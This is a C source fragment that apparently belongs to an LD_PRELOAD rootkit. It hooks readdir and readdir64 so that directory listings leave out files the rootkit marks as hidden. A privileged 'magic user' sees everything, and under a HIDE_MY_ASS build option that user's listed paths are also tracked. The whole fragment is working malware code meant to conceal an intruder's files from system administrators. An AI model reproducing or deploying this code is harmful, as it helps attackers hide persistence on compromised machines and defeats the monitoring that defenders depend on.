struct dirent *readdir(DIR *dirp){
    char *filename;
    struct dirent *dir;
    size_t pathlen;

    hook(CREADDIR);

    while((dir = call(CREADDIR, dirp)) != NULL){
        if(magicusr()){
#ifdef HIDE_MY_ASS
            int outfd = fileno(stdout);
            if(!outfd) return dir;
            if(isatty(outfd)){
                char *apath = gdirname(dirfd(dirp));
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
#endif
            return dir;
        }

        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = gdirname(dirfd(dirp));
        pathlen = strlen(filename) +
                  strlen(dir->d_name) + 2;

        if(pathlen > PATH_MAX){
            free(filename);
            continue;
        }

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);

        if(hidden_path(path))
            continue;
        
        break;
    }

    return dir;
}

struct dirent64 *readdir64(DIR *dirp){
    char *filename;
    struct dirent64 *dir;
    size_t pathlen;

    hook(CREADDIR64);

    while((dir = call(CREADDIR64, dirp)) != NULL){
        if(magicusr()){
#ifdef HIDE_MY_ASS
            int outfd = fileno(stdout);
            if(!outfd) return dir;
            if(isatty(outfd)){
                char *apath = gdirname(dirfd(dirp));
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
#endif
            return dir;
        }

        if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        filename = gdirname(dirfd(dirp));
        pathlen = strlen(filename) +
                  strlen(dir->d_name) + 2;

        if(pathlen > PATH_MAX){
            free(filename);
            continue;
        }

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
        free(filename);

        if(hidden_path(path))
            continue;
        
        break;
    }

    return dir;
}